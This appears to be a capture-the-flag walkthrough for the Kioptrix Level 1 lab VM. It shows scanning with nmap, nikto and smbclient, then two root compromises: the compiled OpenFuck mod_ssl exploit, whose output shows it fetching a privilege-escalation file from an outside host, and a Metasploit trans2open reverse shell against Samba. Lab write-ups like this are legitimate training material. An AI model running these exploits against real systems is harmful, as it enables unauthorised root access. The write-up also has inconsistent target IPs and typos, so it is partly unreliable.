# KIOPTRIX Level 1 Walkthrough

## Target determining
```
sudo netdiscover
```

```
 Currently scanning: 192.168.89.0/16   |   Screen View: Unique Hosts                                                                                         
                                                                                                                                                             
 83 Captured ARP Req/Rep packets, from 17 hosts.   Total size: 4980                                                                                          
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 172.10.1.64     10:12:fb:7e:1a:d5     14     840  Hangzhou Hikvision Digital Technology Co.,Ltd.                                                            
 172.10.1.1      2c:c8:1b:de:a0:3d     39    2340  Routerboard.com                                                                                           
 192.168.1.199   e0:70:ea:fd:4a:81      2     120  HP Inc.                                                                                                   
 172.10.1.109    8c:f5:a3:70:fd:e5      1      60  SAMSUNG ELECTRO-MECHANICS(THAILAND)                                                                       
 172.10.1.26     74:ac:b9:96:bd:98      1      60  Ubiquiti Networks Inc.                                                                                    
 172.10.0.174    f8:4d:89:85:d3:52      2     120  Apple, Inc.                                                                                               
 172.10.0.221    3c:22:fb:29:41:6d      1      60  Apple, Inc.                                                                                               
 172.10.0.222    00:0c:29:b7:19:1a      8     480  VMware, Inc. 
```

Target: 172.10.0.189

## Enumeration

### Nmap
```
nmap -T4 -p- 172.10.0.222 -sSCV
```

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-11 20:55 PDT
Nmap scan report for adsl-172-10-0-222.dsl.sndg02.sbcglobal.net (172.10.0.222)
Host is up (0.0034s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods: 
|_  Potentially risky methods: TRACE
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1024/tcp   status
|_  100024  1           1024/udp   status
139/tcp  open  netbios-ssn Samba smbd (workgroup: 2MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_ssl-date: 2022-08-12T03:57:43+00:00; +1m50s from scanner time.
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
1024/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:7E:69:25 (VMware)

Host script results:
|_clock-skew: 1m49s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.54 seconds
```

### Whatweb

This machine is opening port 80 and 443 (web service), so I use ```whatweb``` to get some infomation of it:

```
whatweb 172.10.0.222
```

```
http://172.10.0.222 [200 OK] Apache[1.3.20][mod_ssl/2.8.4], Country[UNITED STATES][US], HTML5, HTTPServer[Red Hat Linux][Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b], IP[172.10.0.222], OpenSSL[0.9.6b], Title[Document], X-UA-Compatible[IE=edge]
```

This web server is using Apache version 1.3.10 with mod_ssl 2.8.4 on Red Hat Linux.

### Nikto

Using ```Nikto``` to get other interesting infomation about web server:

```
nikto -h http://172.10.0.222
```

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          172.10.0.222
+ Target Hostname:    172.10.0.222
+ Target Port:        80
+ Start Time:         2022-11-01 20:56:40 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ Server may leak inodes via ETags, header found with file /, inode: 34824, size: 301, mtime: Tue Nov  1 02:45:08 2022
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.
+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.
+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).
+ OSVDB-3268: /manual/: Directory indexing found.
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /test.php: This might be interesting...
+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
+ /shell?cat+/etc/hosts: A backdoor was identified.
+ 8724 requests: 0 error(s) and 30 item(s) reported on remote host
+ End Time:           2022-11-01 20:57:06 (GMT-7) (26 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

## Exploitation

### Solution 1: Apache 1.3.20 & mod_ssl 2.8.4

With the version of Apache Web sever 1.3.20 and mod_ssl 2.8.4 as result of Enumeration step, go to exploitdb to get exploiting poc/information:

```
searchsploit Apache 1.3.20 mod_ssl 2.8.4
```

```
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                        | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                  | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                  | unix/remote/47080.c
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Got the POC. Try using each POC to exploit:

```
searchsploit -m unix/remote/47080.c
```

```     
  Exploit: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)
      URL: https://www.exploit-db.com/exploits/47080
     Path: /usr/share/exploitdb/exploits/unix/remote/47080.c
File Type: C source, ASCII text

Copied to: /home/kali/47080.c
```

Now I'm finding the way to use it. After a few minutes, I get them. Thanks to https://github.com/exploit-inters/OpenFuck.

```
gcc -o exploit 47080.c -lcrypto
./exploit 
```

```
*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./exploit target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
```

As result of Enumeration step, I know that this web server is running on Red Hat Linux. The command now is:

```
./exploi 0x6b 172.10.0.222 -c 40
```

```
*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8070
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
xploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmod.c; ./exploit; -kmod.c; gcc -o e 
--03:48:50--  http://172.10.1.9:8000/ptrace-kmod.c
           => `ptrace-kmod.c.1'
Connecting to 172.10.1.9:8000... connected!
HTTP request sent, awaiting response... 200 OK
Length: 3,737 [text/x-csrc]

    0K ...                                                   100% @   3.56 MB/s

03:48:50 (3.56 MB/s) - `ptrace-kmod.c.1' saved [3737/3737]

/usr/bin/ld: cannot open output file exploit: Permission denied
collect2: ld returned 1 exit status
gcc: file path prefix `/usr/bin' never used
whoami
root


id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

**Note:** I can't get the ```ptrace-kmod.c``` from default web server in the POC, so I download it manually and host the local web server to get it.

### Solution 2: Samba smbd

As result of Enumeration step, I know that this target is running Samba, but I don't know what version it is. 

Connect to this target:

```
smbclient -L 172.10.0.222  
```

```
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful

        Server               Comment
        ---------            -------
        KIOPTRIX             Samba Server

        Workgroup            Master
        ---------            -------
        MYGROUP              KIOPTRIX
```

Capture this packet via Wireshark and follow TCP Stream to detect what SMB version of target is:

```
...D DBDHDCCODBDACODACODBDIDJCACACACA. ELEBEMEJCACACACACACACACACACACAAA..........SMBr.....C......................j..MICROSOFT NETWORKS 3.0..LANMAN1.0..LM1.2X002..DOS LANMAN2.1..LANMAN2.1..Samba..NT LANMAN 1.0..NT LM 0.12....U.SMBr...............................2.....................}.
........j.$..*..MYGROUP....J.SMBs.....C...............Q	....
........Q	................
...Unix.Samba....C.SMBs.....................Q	d............Unix.Samba 2.2.1a.MYGROUP....F.SMBu.....C...............Q	d...............\\172.10.0.189\IPC$.?????....1.SMBu.....................Q	d............IPC.IPC....p.SMB%.....C...............Q	d....".................".L...p...1.\PIPE\LANMAN.h.WrLehDz.B16BBDz.........MYGROUP......g.SMB%.....................Q	d...
..'.....8...'.@.....0..........KIOPTRIX..................Samba Server....p.SMB%.....C...............Q	d....".................".L...p...1.\PIPE\LANMAN.h.WrLehDz.B16BBDz.........MYGROUP........SMB%.....................Q	d...
..C.....8...C.@.....L..........MYGROUP...............4...WORKGROUP.............=...KIOPTRIX.JIMMY....#.SMBq.....C...............Q	d.........#.SMBq.....................Q	d......
```

So, the Samba version of this target is 2.2.1a.

Go to exploitdb to get the information of this version:

```
searchsploit Samba 2.2.1                                                                                                                              1 ⨯
```

```
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                | osx/remote/9924.rb
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                           | multiple/remote/10.c
Samba < 3.0.20 - Remote Heap Overflow                                                                                       | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                               | linux_x86/dos/36741.py
```

The module ```trans2open``` is vulnerable. Using ```metasploit``` to exploit it:


```
msfconsole
msf6 > search trans2open
```

```
Matching Modules
================

   #  Name                              Disclosure Date  Rank   Check  Description
   -  ----                              ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)


Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open
```

```
msf6 > use 1
```

```
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
```

```
msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
```

```
payload => linux/x86/shell_reverse_tcp
```

```
msf6 exploit(linux/samba/trans2open) > set rhosts 172.10.0.222
```

```
rhosts => 172.10.0.222
```

Review options:

```
msf6 exploit(linux/samba/trans2open) > options
```

```
Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  172.10.0.222     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   CMD    /bin/sh          yes       The command string to execute
   LHOST  172.10.0.167     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce
```

Exploit the target:

```
msf6 exploit(linux/samba/trans2open) > exploit 
```

```
[*] Started reverse TCP handler on 172.10.0.167:4444 
[*] 172.10.0.189:139 - Trying return address 0xbffffdfc...
[*] 172.10.0.189:139 - Trying return address 0xbffffcfc...
[*] Command shell session 1 opened (172.10.0.167:4444 -> 172.10.0.222:1033) at 2022-08-12 00:59:09 -0700
[*] Command shell session 2 opened (172.10.0.167:4444 -> 172.10.0.222:1034) at 2022-08-12 00:59:10 -0700
whoami
root
id
uid=0(root) gid=0(root) groups=99(nobody)
```
